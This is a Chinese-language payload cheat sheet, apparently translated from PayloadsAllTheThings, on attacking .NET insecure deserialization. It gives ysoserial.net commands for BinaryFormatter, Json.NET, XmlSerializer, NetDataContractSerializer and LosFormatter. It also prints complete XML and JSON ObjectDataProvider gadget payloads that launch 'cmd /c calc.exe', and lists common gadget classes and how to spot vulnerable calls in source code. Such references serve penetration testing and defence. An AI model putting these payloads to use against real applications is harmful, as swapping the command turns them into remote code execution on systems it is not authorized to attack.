# .NET序列化

## 摘要

* [检测](#detection)
* [工具](#tools)
* [格式化器](#formatters)
  * [XmlSerializer](#xmlserializer)
  * [DataContractSerializer](#datacontractserializer)
  * [NetDataContractSerializer](#netdatacontractserializer)
  * [LosFormatter](#losformatter)
  * [JSON.NET](#jsonnet)
  * [BinaryFormatter](#binaryformatter)
* [POP小部件](#pop-gadgets)
* [参考资料](#references)


## 检测

* `AAEAAD`（十六进制）=.NET反序列化BinaryFormatter
* `FF01`（十六进制）/ `/w`（Base64）=.NET ViewState

示例：`AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=`


## 工具

* [pwntester/ysoserial.net - 为各种.NET格式化器生成反序列化有效载荷](https://github.com/pwntester/ysoserial.net)

```ps1
$ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

## 格式化器

![NETNativeFormatters.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Insecure%20Deserialization/Images/NETNativeFormatters.png?raw=true)    
来自[pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15)的.NET本机格式化器

### XmlSerializer

* 在C#源代码中，查找`XmlSerializer(typeof(<TYPE>));`。
* 攻击者必须控制XmlSerializer的**类型**。
* 有效载荷输出：**XML**

```xml
.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
   <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
       <ExpandedElement/>
       <ProjectedProperty0>
           <MethodName>Parse</MethodName>
           <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system<ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start<ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
           <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```


### DataContractSerializer

> DataContractSerializer以松散耦合的方式反序列化。它从不会从传入的数据中读取公共语言运行时（CLR）类型和程序集名称。XmlSerializer的安全模型与DataContractSerializer类似，主要在细节上有所不同。例如，使用XmlIncludeAttribute属性而不是KnownTypeAttribute属性进行类型包含。

* 在C#源代码中，查找`DataContractSerializer(typeof(<TYPE>))`。
* 有效载荷输出：**XML**
* 数据**类型**必须是用户可控的才能被利用


### NetDataContractSerializer 

> 它扩展了`System.Runtime.Serialization.XmlObjectSerializer`类，能够像`BinaryFormatter`一样序列化任何带有可序列化属性的类型。

* 在C#源代码中，查找`NetDataContractSerializer().ReadObject()`。
* 有效载荷输出：**XML**

```ps1
.\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### LosFormatter

* 内部使用`BinaryFormatter`。

```ps1
.\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```


### JSON.NET

* 在C#源代码中，查找`JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings`。
* 有效载荷输出：**JSON**

```ps1
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

### BinaryFormatter

> BinaryFormatter类型是危险的，不建议用于数据处理。应用程序应尽快停止使用BinaryFormatter，即使它们认为处理的数据是可信赖的。BinaryFormatter是不安全的，无法使其安全。

* 在C#源代码中，查找`System.Runtime.Serialization.Binary.BinaryFormatter`。
* 利用需要`[Serializable]`或`ISerializable`接口。
* 有效载荷输出：**二进制**


```ps1
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```


## POP小部件

这些小部件必须具有以下属性：

* 可序列化
* 公共/可设置变量
* 魔法“函数”：Get/Set, OnSerialisation, 构造函数/析构函数

你必须为特定的**格式化器**仔细选择你的**小部件**。


常见有效载荷中使用的一些流行小部件列表。

* **ObjectDataProvider** 来自 `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll`

  * 使用`MethodParameters`设置任意参数
  * 使用`MethodName`调用任意函数 

* **ExpandedWrapper**

  * 指定封装对象的`object types`

  ```cs
  ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
  ```

* **System.Configuration.Install.AssemblyInstaller**

  * 使用Assembly.Load执行有效载荷   

  ```cs
  // System.Configuration.Install.AssemblyInstaller
  public void set_Path(string value){
      if (value == null){
          this.assembly = null;
      }
      this.assembly = Assembly.LoadFrom(value);
  }
  ```


## 参考资料

* [攻击.NET序列化 - Alvaro - 2017年10月20日](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=11)
* [攻击.NET反序列化 - Alvaro Muñoz - 2018年4月28日](https://youtu.be/eDfGpu3iE4Q)
* [黑色星期五13号：JSON攻击 - Alvaro Muñoz (@pwntester) Oleksandr Mirosh - 幻灯片](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [黑色星期五13号：JSON攻击 - Alvaro Muñoz (@pwntester) Oleksandr Mirosh - 白皮书](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-attacks-wp.pdf)
* [黑色星期五13号：JSON攻击 - Alvaro Muñoz (@pwntester) Oleksandr Mirosh - DEF CON 25会议](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
* [你是我的类型吗？通过序列化打破.NET沙箱 - James Forshaw - 幻灯片](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
* [你是我的类型吗？通过序列化打破.NET沙箱 - James Forshaw - 白皮书](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
* [现在你序列化，现在你不序列化 - 系统性狩猎反序列化漏洞 - ALYSSA RAHMANDEC](https://www.mandiant.com/resources/blog/hunting-deserialization-exploits)
* [通过ViewState在ASP.NET中利用反序列化 - Soroush Dalili (@irsdl) - 2019年4月](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [绕过.NET序列化绑定器 - Markus Wulftange - 2022年6月28日](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
* [基本.Net反序列化（ObjectDataProvider小部件，ExpandedWrapper和Json.Net） - hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net)
* [Sitecore Experience Platform预认证RCE - CVE-2021-42237 - 2021年11月2日 - Shubham Shah](https://blog.assetnote.io/2021/11/02/sitecore-rce/)
* [寻找新的DataContractSerializer RCE小部件链 - 2019年11月7日 - dugisec](https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/)